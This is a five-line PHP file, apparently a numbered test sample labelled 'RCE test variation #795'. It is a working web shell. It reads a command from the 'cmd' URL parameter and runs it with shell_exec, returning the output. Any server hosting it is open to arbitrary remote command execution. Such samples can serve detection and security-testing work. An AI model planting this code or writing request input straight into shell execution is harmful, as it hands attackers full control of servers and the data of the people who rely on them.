<?php
// RCE test variation #795
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>